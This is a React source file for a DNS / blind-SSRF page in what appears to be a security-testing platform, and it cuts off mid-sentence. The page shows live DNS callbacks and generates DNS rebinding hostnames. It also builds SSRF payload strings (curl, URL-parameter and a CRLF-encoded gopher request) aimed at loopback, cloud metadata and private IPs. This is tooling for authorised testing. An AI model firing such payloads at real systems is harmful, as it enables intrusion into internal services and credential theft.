import { createFileRoute, Link } from '@tanstack/react-router';
import { useState, useMemo, useCallback, useEffect, useRef } from 'react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { API_URL } from '@/lib/config';
import { apiFetch } from '@/lib/apiFetch';
import { useEventSSE } from '@/hooks/useEventSSE';
import { useCopyButton } from '@/hooks/useCopyButton';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Badge } from '@/components/ui/badge';
import {
  Collapsible,
  CollapsibleContent,
  CollapsibleTrigger,
} from '@/components/ui/collapsible';
import {
  Select,
  SelectContent,
  SelectGroup,
  SelectItem,
  SelectLabel,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { DnsEventDetail, type DnsEvent } from '@/components/DnsEventDetail';
import {
  AlertCircle,
  Copy,
  Check,
  RefreshCw,
  Wifi,
  Globe,
  Radio,
  Terminal,
  Code,
  Database,
  FileCode,
  Link as LinkIcon,
  Loader2,
  HelpCircle,
  ChevronDown,
  Activity,
  ArrowRight,
  ArrowRightLeft,
  Server,
  Cloud,
  Network,
  Zap,
  Inbox,
  Layers,
  List,
  Target,
} from 'lucide-react';
import { toast } from 'sonner';
import { cn } from '@/lib/utils';

export const Route = createFileRoute('/security/dns')({
  component: DnsToolsPage,
});

interface DnsStatus {
  configured: boolean;
  enabled: boolean;
  running: boolean;
  nsConfigured: boolean;
  mode: string | null;
  domain: string | null;
  responseIp: string | null;
  attackerIpDefault: string | null;
  lastCallbackAt: string | null;
}

interface Program {
  readonly id: number;
  readonly name: string;
}

interface SsrfTarget {
  readonly ip: string;
  readonly label: string;
  readonly description: string;
  readonly category: 'loopback' | 'metadata' | 'rfc1918';
}

type RebindStrategy = 'fs' | 'ma' | 'rr' | 'rd';
type DnsTab = 'live' | 'rebind' | 'capture';

interface RebindResponse {
  readonly token: string;
  readonly hostname: string;
  readonly attackerIp: string;
  readonly targetIp: string;
  readonly strategy: string;
  readonly programId: number | null;
}

interface CaptureToken {
  readonly token: string;
  readonly hostname: string;
  readonly baseDomain: string;
  readonly programId: number | null;
  readonly strategy: string;
}

interface DnsEventsResponse {
  readonly data: DnsEvent[];
}

const REBIND_STRATEGIES: readonly {
  value: RebindStrategy;
  label: string;
  hint: string;
  group: 'server' | 'browser';
}[] = [
  { value: 'rd', label: 'Random (recommended)', hint: 'Answers attacker/target at random per query — robust for most server-side SSRF.', group: 'server' },
  { value: 'fs', label: 'First-then-second', hint: 'First lookup resolves to the attacker IP, later lookups to the internal target.', group: 'server' },
  { value: 'ma', label: 'Multiple-A', hint: 'Returns both IPs in one answer; the browser retries the other on connect failure.', group: 'browser' },
  { value: 'rr', label: 'Round-robin', hint: 'Alternates the answer IP each query — classic browser DNS rebinding.', group: 'browser' },
];

const CATEGORY_ORDER: readonly SsrfTarget['category'][] = ['loopback', 'metadata', 'rfc1918'];
const CATEGORY_LABELS: Record<SsrfTarget['category'], string> = {
  loopback: 'Loopback',
  metadata: 'Cloud Metadata',
  rfc1918: 'RFC1918 / Private',
};

type IconComponent = React.ComponentType<{ className?: string }>;

const CATEGORY_ICONS: Record<SsrfTarget['category'], IconComponent> = {
  loopback: Server,
  metadata: Cloud,
  rfc1918: Network,
};

type InteractionKind = 'capture' | 'rebind' | 'embed';
type AnswerClass = 'benign' | 'internal' | 'neutral';

interface RebindDecode {
  readonly attackerIp: string | null;
  readonly targetIp: string | null;
  readonly strategy: string | null;
}

interface AnswerChip {
  readonly ip: string;
  readonly count: number;
  readonly cls: AnswerClass;
}

interface Interaction {
  readonly key: string;
  readonly kind: InteractionKind;
  readonly strategy: string | null;
  readonly host: string;
  readonly token: string | null;
  readonly decode: RebindDecode | null;
  readonly latest: DnsEvent;
  readonly lookupCount: number;
  readonly firstAt: number;
  readonly lastAt: number;
  readonly recordTypes: readonly string[];
  readonly answers: readonly AnswerChip[];
}

function hexDwordToIpv4(hex: string): string | null {
  if (!/^[0-9a-fA-F]{8}$/.test(hex)) return null;
  const n = Number.parseInt(hex, 16);
  return `${(n >>> 24) & 0xff}.${(n >>> 16) & 0xff}.${(n >>> 8) & 0xff}.${n & 0xff}`;
}

function firstLabel(query: string | null): string {
  if (!query) return '';
  const dot = query.indexOf('.');
  return dot === -1 ? query : query.slice(0, dot);
}

function classifyKind(query: string | null): InteractionKind {
  const label = firstLabel(query);
  if (label.startsWith('rb-')) return 'rebind';
  if (label.startsWith('ip-')) return 'embed';
  return 'capture';
}

function decodeRebindHost(query: string | null): RebindDecode | null {
  const label = firstLabel(query);
  if (!label.startsWith('rb-')) return null;
  const parts = label.split('-');
  if (parts.length < 4) return null;
  return {
    attackerIp: hexDwordToIpv4(parts[1] ?? ''),
    targetIp: hexDwordToIpv4(parts[2] ?? ''),
    strategy: parts[3] ?? null,
  };
}

function classifyAnswer(ip: string, decode: RebindDecode | null): AnswerClass {
  if (ip === 'NODATA' || !decode) return 'neutral';
  if (decode.attackerIp && ip === decode.attackerIp) return 'benign';
  if (decode.targetIp && ip === decode.targetIp) return 'internal';
  return 'neutral';
}

function targetCategory(ip: string): SsrfTarget['category'] | null {
  if (!ip) return null;
  if (ip.startsWith('127.')) return 'loopback';
  if (ip.startsWith('169.254.')) return 'metadata';
  if (ip.startsWith('10.') || ip.startsWith('192.168.') || /^172\.(1[6-9]|2\d|3[01])\./.test(ip)) {
    return 'rfc1918';
  }
  return null;
}

function timeAgo(from: number, now: number): string {
  const diff = Math.max(0, Math.floor((now - from) / 1000));
  if (diff < 5) return 'just now';
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return `${Math.floor(diff / 86400)}d ago`;
}

function useNow(intervalMs: number): number {
  const [now, setNow] = useState(() => Date.now());
  useEffect(() => {
    const t = setInterval(() => setNow(Date.now()), intervalMs);
    return () => clearInterval(t);
  }, [intervalMs]);
  return now;
}

function buildInteractions(events: readonly DnsEvent[]): Interaction[] {
  const groups = new Map<string, DnsEvent[]>();
  for (const ev of events) {
    const key = ev.correlationToken ?? ev.dnsQuery ?? `id:${ev.id}`;
    const list = groups.get(key);
    if (list) list.push(ev);
    else groups.set(key, [ev]);
  }

  const interactions: Interaction[] = [];
  for (const [key, list] of groups) {
    const sorted = [...list].sort(
      (a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime(),
    );
    const latest = sorted[sorted.length - 1];
    const host = latest.dnsQuery ?? sorted.find((e) => e.dnsQuery)?.dnsQuery ?? '—';
    const decode = decodeRebindHost(host);

    const typeSet = new Set<string>();
    for (const e of sorted) if (e.dnsType) typeSet.add(e.dnsType);

    const counts = new Map<string, number>();
    for (const e of sorted) {
      const raw = e.dnsAnswer?.trim();
      if (!raw) {
        counts.set('NODATA', (counts.get('NODATA') ?? 0) + 1);
        continue;
      }
      for (const part of raw.split(',')) {
        const ip = part.trim();
        if (!ip) continue;
        counts.set(ip, (counts.get(ip) ?? 0) + 1);
      }
    }
    const answers: AnswerChip[] = [...counts.entries()]
      .map(([ip, count]) => ({ ip, count, cls: classifyAnswer(ip, decode) }))
      .sort((a, b) => b.count - a.count);

    interactions.push({
      key,
      kind: classifyKind(host),
      strategy: decode?.strategy ?? latest.dnsRebindStrategy ?? null,
      host,
      token: latest.correlationToken,
      decode,
      latest,
      lookupCount: sorted.length,
      firstAt: new Date(sorted[0].createdAt).getTime(),
      lastAt: new Date(latest.createdAt).getTime(),
      recordTypes: [...typeSet],
      answers,
    });
  }
  interactions.sort((a, b) => b.lastAt - a.lastAt);
  return interactions;
}

const ANSWER_TONE: Record<AnswerClass, string> = {
  benign: 'border-emerald-500/20 bg-emerald-500/5 text-emerald-600/90 dark:text-emerald-400/90',
  internal: 'border-rose-500/20 bg-rose-500/5 text-rose-600/90 dark:text-rose-400/90',
  neutral: 'border-border bg-muted/40 text-muted-foreground',
};

const ANSWER_BAR: Record<AnswerClass, string> = {
  benign: 'bg-emerald-500/60',
  internal: 'bg-rose-500/60',
  neutral: 'bg-muted-foreground/30',
};

function HowItWorks({ children }: { children: React.ReactNode }) {
  const [open, setOpen] = useState(false);
  return (
    <Collapsible open={open} onOpenChange={setOpen}>
      <div className="rounded-lg border bg-muted/30">
        <CollapsibleTrigger className="flex w-full items-center justify-between gap-2 px-4 py-2.5 text-sm font-medium text-foreground/90 hover:text-foreground">
          <span className="flex items-center gap-2">
            <HelpCircle className="w-4 h-4 text-muted-foreground" />
            How this works
          </span>
          <ChevronDown
            className={cn(
              'w-4 h-4 text-muted-foreground transition-transform duration-200',
              open && 'rotate-180',
            )}
          />
        </CollapsibleTrigger>
        <CollapsibleContent className="px-4 pb-3 pt-0 text-xs leading-relaxed text-muted-foreground space-y-2">
          {children}
        </CollapsibleContent>
      </div>
    </Collapsible>
  );
}

function usePrograms() {
  return useQuery({
    queryKey: ['programs'],
    queryFn: async () => {
      const res = await apiFetch(`${API_URL}/api/programs?limit=200`);
      if (!res.ok) throw new Error('Failed to fetch programs');
      return res.json() as Promise<{ data: Program[] }>;
    },
  });
}

function DnsToolsPage() {
  const [tab, setTab] = useState<DnsTab>('live');

  const { data: status } = useQuery<DnsStatus>({
    queryKey: ['dns-status'],
    queryFn: async () => {
      const res = await apiFetch(`${API_URL}/api/settings/dns/status`);
      if (!res.ok) throw new Error('Failed to fetch DNS status');
      return res.json();
    },
    refetchInterval: 5000,
  });

  const { data: programsData } = usePrograms();
  const programs = programsData?.data ?? [];

  if (!status?.configured) {
    return (
      <div className="container mx-auto py-12 px-4 sm:px-6">
        <Card className="max-w-2xl mx-auto">
          <CardHeader className="text-center">
            <div className="mx-auto mb-4 p-4 bg-muted rounded-full w-fit">
              <AlertCircle className="w-12 h-12 text-muted-foreground" />
            </div>
            <CardTitle>DNS Not Configured</CardTitle>
            <CardDescription>
              Configure DNS in Settings to use DNS-based testing tools
            </CardDescription>
          </CardHeader>
          <CardContent className="flex flex-col items-center gap-4">
            <Button asChild>
              <Link to="/settings">Go to Settings</Link>
            </Button>
            <p className="text-sm text-muted-foreground text-center">
              DNS tools let you observe blind-SSRF DNS lookups, generate signed rebinding
              payloads, and mint capture hostnames with full DNS→HTTP correlation.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (!status.enabled) {
    return (
      <div className="container mx-auto py-12 px-4 sm:px-6">
        <Alert className="max-w-2xl mx-auto">
          <Wifi className="h-4 w-4" />
          <AlertTitle>DNS Server Disabled</AlertTitle>
          <AlertDescription>
            Enable DNS in Settings to use this feature.{' '}
            <Link to="/settings" className="underline">
              Go to Settings
            </Link>
          </AlertDescription>
        </Alert>
      </div>
    );
  }

  return (
    <div className="container mx-auto py-6 px-4 sm:px-6 space-y-6 max-w-5xl">
      <div className="flex items-center justify-between gap-3">
        <div>
          <h1 className="text-3xl font-bold">DNS / Blind-SSRF</h1>
          <p className="text-muted-foreground mt-1">
            Live DNS callbacks, signed rebinding payloads, and capture hostnames
          </p>
        </div>
        <Badge variant="default" className="gap-1.5 shrink-0">
          <Wifi className="w-3 h-3" />
          DNS Active
        </Badge>
      </div>

      <Tabs value={tab} onValueChange={(v) => setTab(v as DnsTab)}>
        <TabsList className="grid grid-cols-3 w-full max-w-md">
          <TabsTrigger value="live" className="gap-2">
            <Radio className="w-3.5 h-3.5" />
            Live DNS
          </TabsTrigger>
          <TabsTrigger value="rebind" className="gap-2">
            <Globe className="w-3.5 h-3.5" />
            Rebinding
          </TabsTrigger>
          <TabsTrigger value="capture" className="gap-2">
            <LinkIcon className="w-3.5 h-3.5" />
            Capture
          </TabsTrigger>
        </TabsList>

        <TabsContent value="live" className="mt-6">
          <LiveDnsTab programs={programs} onNavigate={setTab} />
        </TabsContent>
        <TabsContent value="rebind" className="mt-6">
          <RebindingTab programs={programs} attackerIpDefault={status.attackerIpDefault} />
        </TabsContent>
        <TabsContent value="capture" className="mt-6">
          <CaptureTab
            domain={status.domain}
            responseIp={status.responseIp}
            programs={programs}
          />
        </TabsContent>
      </Tabs>
    </div>
  );
}

function StatTile({
  icon: Icon,
  label,
  value,
  accent,
}: {
  icon: IconComponent;
  label: string;
  value: string;
  accent?: string;
}) {
  return (
    <div className="flex items-center gap-2.5 rounded-lg border bg-card px-3 py-2">
      <div className={cn('rounded-md p-1.5', accent ?? 'bg-muted text-muted-foreground')}>
        <Icon className="w-3.5 h-3.5" />
      </div>
      <div className="min-w-0">
        <p className="text-[11px] leading-tight text-muted-foreground">{label}</p>
        <p className="text-sm font-semibold leading-tight tabular-nums truncate">{value}</p>
      </div>
    </div>
  );
}

function KindBadge({ kind, strategy }: { kind: InteractionKind; strategy: string | null }) {
  if (kind === 'rebind') {
    return (
      <Badge
        variant="outline"
        className="gap-1 border-amber-500/25 bg-amber-500/5 text-amber-600/90 dark:text-amber-400/90"
      >
        <Network className="w-3 h-3" />
        Rebind{strategy ? `·${strategy}` : ''}
      </Badge>
    );
  }
  if (kind === 'embed') {
    return (
      <Badge
        variant="outline"
        className="gap-1 border-sky-500/25 bg-sky-500/5 text-sky-600/90 dark:text-sky-400/90"
      >
        <Code className="w-3 h-3" />
        Embed
      </Badge>
    );
  }
  return (
    <Badge variant="secondary" className="gap-1">
      <LinkIcon className="w-3 h-3" />
      Capture
    </Badge>
  );
}

function AnswerBar({ answers }: { answers: readonly AnswerChip[] }) {
  const total = answers.reduce((s, a) => s + a.count, 0);
  if (total === 0) return null;
  const sums: Record<AnswerClass, number> = { benign: 0, internal: 0, neutral: 0 };
  for (const a of answers) sums[a.cls] += a.count;
  const order: readonly AnswerClass[] = ['benign', 'internal', 'neutral'];
  return (
    <div className="flex h-1.5 w-full overflow-hidden rounded-full bg-muted">
      {order.map((cls) =>
        sums[cls] > 0 ? (
          <div
            key={cls}
            className={ANSWER_BAR[cls]}
            style={{ width: `${(sums[cls] / total) * 100}%` }}
          />
        ) : null,
      )}
    </div>
  );
}

function InteractionCard({
  interaction,
  now,
  flash,
  onOpen,
}: {
  interaction: Interaction;
  now: number;
  flash: boolean;
  onOpen: () => void;
}) {
  const hasFlip = interaction.answers.some((a) => a.cls === 'benign')
    && interaction.answers.some((a) => a.cls === 'internal');
  return (
    <button
      type="button"
      onClick={onOpen}
      aria-label={`Open interaction ${interaction.host}`}
      className={cn(
        'w-full rounded-lg border p-3 text-left transition-colors duration-500',
        'animate-in fade-in-0 hover:bg-muted/30 hover:border-border',
        flash && 'dns-flash',
      )}
    >
      <div className="flex items-start justify-between gap-3">
        <div className="flex min-w-0 items-center gap-2">
          <KindBadge kind={interaction.kind} strategy={interaction.strategy} />
          <span className="truncate font-mono text-xs text-foreground/90" title={interaction.host}>
            {interaction.host}
          </span>
        </div>
        <div className="shrink-0 text-right">
          <p className="text-xs font-medium tabular-nums">{timeAgo(interaction.lastAt, now)}</p>
          {interaction.lookupCount > 1 && (
            <p className="text-[10px] text-muted-foreground">
              started {timeAgo(interaction.firstAt, now)}
            </p>
          )}
        </div>
      </div>

      <div className="mt-2.5 flex flex-wrap items-center gap-1.5">
        <Badge variant="outline" className="gap-1 text-[10px] font-normal">
          <Activity className="w-2.5 h-2.5" />
          {interaction.lookupCount} lookup{interaction.lookupCount === 1 ? '' : 's'}
        </Badge>
        {interaction.recordTypes.map((t) => (
          <Badge key={t} variant="secondary" className="text-[10px] font-mono">
            {t}
          </Badge>
        ))}
        {hasFlip && (
          <span className="inline-flex items-center gap-1 text-[10px] font-medium text-amber-600/80 dark:text-amber-400/80">
            <ArrowRightLeft className="w-3 h-3" />
            flip observed
          </span>
        )}
      </div>

      <div className="mt-2.5 space-y-1.5">
        <AnswerBar answers={interaction.answers} />
        <div className="flex flex-wrap gap-1.5">
          {interaction.answers.map((a) => (
            <span
              key={a.ip}
              className={cn(
                'inline-flex items-center gap-1 rounded-md border px-1.5 py-0.5 text-[11px]',
                ANSWER_TONE[a.cls],
              )}
            >
              <span className="font-mono">{a.ip}</span>
              <span className="opacity-70">×{a.count}</span>
            </span>
          ))}
        </div>
      </div>
    </button>
  );
}

function RawDnsRow({
  ev,
  onOpen,
}: {
  ev: DnsEvent;
  onOpen: () => void;
}) {
  const decode = decodeRebindHost(ev.dnsQuery);
  const firstAnswer = ev.dnsAnswer?.split(',')[0]?.trim() ?? '';
  const cls = firstAnswer ? classifyAnswer(firstAnswer, decode) : 'neutral';
  return (
    <TableRow className="cursor-pointer hover:bg-muted/50" onClick={onOpen}>
      <TableCell className="text-xs whitespace-nowrap">
        {new Date(ev.createdAt).toLocaleTimeString()}
      </TableCell>
      <TableCell>
        <Badge variant="secondary" className="text-xs">
          {ev.dnsType ?? '?'}
        </Badge>
      </TableCell>
      <TableCell className="font-mono text-xs max-w-[220px] truncate" title={ev.dnsQuery ?? ''}>
        {ev.dnsQuery ?? '—'}
      </TableCell>
      <TableCell
        className={cn(
          'font-mono text-xs max-w-[140px] truncate',
          cls === 'benign' && 'text-emerald-600 dark:text-emerald-400',
          cls === 'internal' && 'text-rose-600 dark:text-rose-400',
        )}
        title={ev.dnsAnswer ?? ''}
      >
        {ev.dnsAnswer ?? '—'}
      </TableCell>
      <TableCell>
        {ev.dnsRebindStrategy ? (
          <Badge variant="outline" className="text-xs font-mono">
            {ev.dnsRebindStrategy}
          </Badge>
        ) : (
          <span className="text-muted-foreground text-xs">—</span>
        )}
      </TableCell>
      <TableCell className="hidden md:table-cell font-mono text-xs">
        {ev.ipAddress && ev.ipAddress !== 'unknown' ? (
          ev.ipAddress
        ) : (
          <span className="text-muted-foreground">—</span>
        )}
      </TableCell>
      <TableCell className="hidden lg:table-cell">
        {ev.correlationToken ? (
          <Badge variant="outline" className="font-mono text-[10px]">
            {ev.correlationToken.slice(0, 8)}…
          </Badge>
        ) : (
          <span className="text-muted-foreground text-xs">—</span>
        )}
      </TableCell>
    </TableRow>
  );
}

function LiveDnsEmpty({ onNavigate }: { onNavigate: (tab: DnsTab) => void }) {
  return (
    <div className="flex flex-col items-center gap-4 rounded-lg border border-dashed py-14 px-6 text-center">
      <div className="rounded-full bg-primary/10 p-4">
        <Inbox className="w-8 h-8 text-primary" />
      </div>
      <div className="space-y-1">
        <p className="text-sm font-medium">No DNS lookups yet</p>
        <p className="max-w-sm text-xs text-muted-foreground">
          Mint a capture hostname or generate a signed rebinding payload, point it at your target,
          and callbacks will stream in here — grouped by interaction, in real time.
        </p>
      </div>
      <div className="flex flex-wrap justify-center gap-2">
        <Button size="sm" onClick={() => onNavigate('rebind')} className="gap-1.5">
          <Globe className="w-3.5 h-3.5" />
          Rebinding payload
        </Button>
        <Button size="sm" variant="outline" onClick={() => onNavigate('capture')} className="gap-1.5">
          <LinkIcon className="w-3.5 h-3.5" />
          Capture hostname
        </Button>
      </div>
    </div>
  );
}

function LiveDnsTab({
  programs,
  onNavigate,
}: {
  programs: readonly Program[];
  onNavigate: (tab: DnsTab) => void;
}) {
  const queryClient = useQueryClient();
  const [selected, setSelected] = useState<DnsEvent | null>(null);
  const [open, setOpen] = useState(false);
  const [view, setView] = useState<'grouped' | 'raw'>('raw');
  const now = useNow(1000);

  const { data, isLoading } = useQuery({
    queryKey: ['dns-events'],
    queryFn: async () => {
      const res = await apiFetch(`${API_URL}/api/events?type=dns`);
      if (!res.ok) throw new Error('Failed to fetch DNS events');
      return res.json() as Promise<DnsEventsResponse>;
    },
  });
  const events = data?.data ?? [];

  const interactions = useMemo(() => buildInteractions(events), [events]);

  const prevLastAt = useRef<Map<string, number>>(new Map());
  const initialized = useRef(false);
  const [flashing, setFlashing] = useState<Set<string>>(new Set());

  useEffect(() => {
    if (!initialized.current) {
      for (const it of interactions) prevLastAt.current.set(it.key, it.lastAt);
      initialized.current = true;
      return;
    }
    const changed = new Set<string>();
    for (const it of interactions) {
      const prev = prevLastAt.current.get(it.key);
      if (prev === undefined || it.lastAt > prev) changed.add(it.key);
      prevLastAt.current.set(it.key, it.lastAt);
    }
    if (changed.size === 0) return;
    setFlashing(changed);
    const t = setTimeout(() => setFlashing(new Set()), 1600);
    return () => clearTimeout(t);
  }, [interactions]);

  const handleNewEvent = useCallback(
    (event: { type?: string; dnsType?: string | null }) => {
      if (event.type !== 'dns') return;
      queryClient.invalidateQueries({ queryKey: ['dns-events'] });
      toast.success(`New DNS ${event.dnsType ?? ''} lookup`.trim(), { duration: 3000 });
    },
    [queryClient],
  );
  useEventSSE(true, handleNewEvent);

  const openInteraction = (ev: DnsEvent) => {
    setSelected(ev);
    setOpen(true);
  };

  const rebindCount = interactions.filter((i) => i.kind === 'rebind').length;
  const captureCount = interactions.filter((i) => i.kind !== 'rebind').length;
  const lastHit = interactions.length > 0 ? interactions[0].lastAt : null;

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-4">
        <StatTile
          icon={Activity}
          label="Total lookups"
          value={String(events.length)}
          accent="bg-primary/10 text-primary"
        />
        <StatTile icon={Layers} label="Interactions" value={String(interactions.length)} />
        <StatTile icon={Network} label="Rebind / Capture" value={`${rebindCount} / ${captureCount}`} />
        <StatTile
          icon={Zap}
          label="Last hit"
          value={lastHit ? timeAgo(lastHit, now) : '—'}
        />
      </div>

      <Card>
        <CardHeader>
          <div className="flex flex-wrap items-center justify-between gap-3">
            <div className="flex items-center gap-3">
              <div className="rounded-lg bg-primary/10 p-2">
                <Radio className="w-5 h-5 text-primary" />
              </div>
              <div>
                <CardTitle className="flex items-center gap-2">
                  Live DNS Feed
                  <span className="inline-flex items-center gap-1.5 text-[11px] font-medium uppercase tracking-wide text-emerald-600 dark:text-emerald-400">
                    <span className="relative flex size-2">
                      <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-500 opacity-75" />
                      <span className="relative inline-flex size-2 rounded-full bg-emerald-500" />
                    </span>
                    Live
                  </span>
                </CardTitle>
                <CardDescription>
                  {view === 'grouped'
                    ? 'DNS lookups grouped by interaction. Click a card for the full record and DNS→HTTP correlation.'
                    : 'Every DNS lookup in arrival order. Click a row for the full record.'}
                </CardDescription>
              </div>
            </div>
            <div className="flex items-center gap-1 rounded-md border p-0.5">
              <button
                type="button"
                onClick={() => setView('grouped')}
                aria-pressed={view === 'grouped'}
                className={cn(
                  'inline-flex items-center gap-1.5 rounded px-2.5 py-1 text-xs font-medium transition-colors',
                  view === 'grouped'
                    ? 'bg-primary text-primary-foreground'
                    : 'text-muted-foreground hover:text-foreground',
                )}
              >
                <Layers className="w-3.5 h-3.5" />
                Grouped
              </button>
              <button
                type="button"
                onClick={() => setView('raw')}
                aria-pressed={view === 'raw'}
                className={cn(
                  'inline-flex items-center gap-1.5 rounded px-2.5 py-1 text-xs font-medium transition-colors',
                  view === 'raw'
                    ? 'bg-primary text-primary-foreground'
                    : 'text-muted-foreground hover:text-foreground',
                )}
              >
                <List className="w-3.5 h-3.5" />
                Raw
              </button>
            </div>
          </div>
        </CardHeader>
        <CardContent>
          {isLoading ? (
            <div className="py-10 text-center text-sm text-muted-foreground">Loading…</div>
          ) : events.length === 0 ? (
            <LiveDnsEmpty onNavigate={onNavigate} />
          ) : view === 'grouped' ? (
            <div className="space-y-2">
              {interactions.map((it) => (
                <InteractionCard
                  key={it.key}
                  interaction={it}
                  now={now}
                  flash={flashing.has(it.key)}
                  onOpen={() => openInteraction(it.latest)}
                />
              ))}
            </div>
          ) : (
            <div className="rounded-lg border overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-[90px]">Time</TableHead>
                    <TableHead className="w-[70px]">Type</TableHead>
                    <TableHead className="min-w-[160px]">Query</TableHead>
                    <TableHead className="min-w-[100px]">Answer</TableHead>
                    <TableHead className="w-[80px]">Rebind</TableHead>
                    <TableHead className="hidden md:table-cell">Resolver</TableHead>
                    <TableHead className="hidden lg:table-cell">Token</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {events.map((ev) => (
                    <RawDnsRow key={ev.id} ev={ev} onOpen={() => openInteraction(ev)} />
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>

      <DnsEventDetail
        event={selected}
        open={open}
        onClose={() => setOpen(false)}
        programs={programs}
      />
    </div>
  );
}

function StrategyOption({
  strategy,
  active,
  onSelect,
}: {
  strategy: (typeof REBIND_STRATEGIES)[number];
  active: boolean;
  onSelect: () => void;
}) {
  return (
    <button
      type="button"
      onClick={onSelect}
      className={cn(
        'text-left rounded-lg border p-3 transition-colors',
        active
          ? 'border-primary bg-primary/5 ring-1 ring-primary'
          : 'border-border hover:bg-muted/50',
      )}
    >
      <div className="flex items-center gap-2">
        <span className="font-mono text-xs font-semibold uppercase">{strategy.value}</span>
        <span className="text-sm font-medium">{strategy.label}</span>
      </div>
      <p className="text-xs text-muted-foreground mt-1">{strategy.hint}</p>
    </button>
  );
}

function PayloadLine({
  label,
  value,
  id,
  copy,
  isCopied,
}: {
  label: string;
  value: string;
  id: string;
  copy: (text: string, id: string, label: string) => void;
  isCopied: (id: string) => boolean;
}) {
  const multiline = value.includes('\n');
  return (
    <div className="rounded-md border bg-muted/30">
      <div className="flex items-center gap-2 px-3 py-2">
        <span className="w-24 shrink-0 truncate text-[11px] font-medium text-muted-foreground sm:w-32">
          {label}
        </span>
        {!multiline && (
          <code className="min-w-0 flex-1 truncate font-mono text-xs" title={value}>
            {value}
          </code>
        )}
        <Button
          variant="ghost"
          size="icon"
          aria-label={`Copy ${label}`}
          onClick={() => copy(value, id, label)}
          className="ml-auto h-6 w-6 shrink-0"
        >
          {isCopied(id) ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
        </Button>
      </div>
      {multiline && (
        <pre className="overflow-x-auto border-t px-3 py-2 text-xs font-mono">{value}</pre>
      )}
    </div>
  );
}

function IpPill({
  ip,
  label,
  tone,
  icon: Icon,
}: {
  ip: string;
  label: string;
  tone: 'benign' | 'internal';
  icon?: IconComponent;
}) {
  return (
    <div
      className={cn(
        'flex-1 rounded-lg border px-3 py-2 text-center',
        tone === 'benign'
          ? 'border-emerald-500/40 bg-emerald-500/10 text-emerald-700 dark:text-emerald-300'
          : 'border-rose-500/40 bg-rose-500/10 text-rose-700 dark:text-rose-300',
      )}
    >
      <p className="flex items-center justify-center gap-1 font-mono text-sm font-semibold">
        {Icon && <Icon className="w-3.5 h-3.5" />}
        <span className="truncate">{ip || '—'}</span>
      </p>
      <p className="text-[10px] uppercase tracking-wide opacity-80">{label}</p>
    </div>
  );
}

function RebindingTab({
  programs,
  attackerIpDefault,
}: {
  programs: readonly Program[];
  attackerIpDefault: string | null;
}) {
  const { copy, isCopied } = useCopyButton();
  const [targetSelect, setTargetSelect] = useState('');
  const [customIp, setCustomIp] = useState('');
  const [strategy, setStrategy] = useState<RebindStrategy>('rd');
  const [attackerIp, setAttackerIp] = useState(attackerIpDefault ?? '');
  const [programId, setProgramId] = useState('none');
  const [note, setNote] = useState('');
  const [result, setResult] = useState<RebindResponse | null>(null);

  const { data: targetsData } = useQuery({
    queryKey: ['ssrf-targets'],
    queryFn: async () => {
      const res = await apiFetch(`${API_URL}/api/interactions/targets`);
      if (!res.ok) throw new Error('Failed to fetch targets');
      return res.json() as Promise<{ data: SsrfTarget[] }>;
    },
  });
  const targets = targetsData?.data ?? [];

  const grouped = useMemo(() => {
    const map = new Map<SsrfTarget['category'], SsrfTarget[]>();
    for (const t of targets) {
      const list = map.get(t.category) ?? [];
      list.push(t);
      map.set(t.category, list);
    }
    return map;
  }, [targets]);

  const effectiveTarget = customIp.trim() || targetSelect;
  const effectiveAttackerIp = attackerIp.trim() || attackerIpDefault || '';
  const effectiveCategory = targetCategory(effectiveTarget);
  const CategoryIcon = effectiveCategory ? CATEGORY_ICONS[effectiveCategory] : Target;

  const rebindMutation = useMutation({
    mutationFn: async () => {
      const res = await apiFetch(`${API_URL}/api/interactions/rebind`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          targetIp: effectiveTarget,
          strategy,
          attackerIp: effectiveAttackerIp,
          ...(programId !== 'none' ? { programId: Number(programId) } : {}),
          ...(note.trim() ? { note: note.trim() } : {}),
        }),
      });
      const json = await res.json();
      if (!res.ok) {
        throw new Error(json.error || 'Failed to generate rebinding hostname');
      }
      return json as RebindResponse;
    },
    onSuccess: (data) => {
      setResult(data);
      toast.success('Rebinding hostname generated');
    },
    onError: (e: Error) => toast.error(e.message),
  });

  const payloads = result
    ? [
        { id: 'p-http', label: 'HTTP', value: `http://${result.hostname}/` },
        { id: 'p-http80', label: 'HTTP :80', value: `http://${result.hostname}:80/` },
        { id: 'p-curl', label: 'curl', value: `curl -s "http://${result.hostname}/"` },
        {
          id: 'p-redir',
          label: 'URL-parameter SSRF',
          value: `http://target.com/api?url=http://${result.hostname}/`,
        },
        {
          id: 'p-gopher',
          label: 'gopher redirect',
          value: `gopher://${result.hostname}:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20${result.hostname}%0d%0a%0d%0a`,
        },
      ]
    : [];

  return (
    <div className="space-y-6">
      <HowItWorks>
        <p>
          A <span className="font-medium text-foreground/80">blind SSRF</span> means the server
          fetches a hostname you control but you never see the response. DNS rebinding escalates it:
          the <span className="font-medium text-foreground/80">same</span> hostname resolves FIRST
          to a benign/public IP (passing the app's "is this public?" check), then to an internal
          target — <span className="font-mono">127.0.0.1</span>, cloud metadata{' '}
          <span className="font-mono">169.254.169.254</span>, or an RFC1918 address — exploiting the
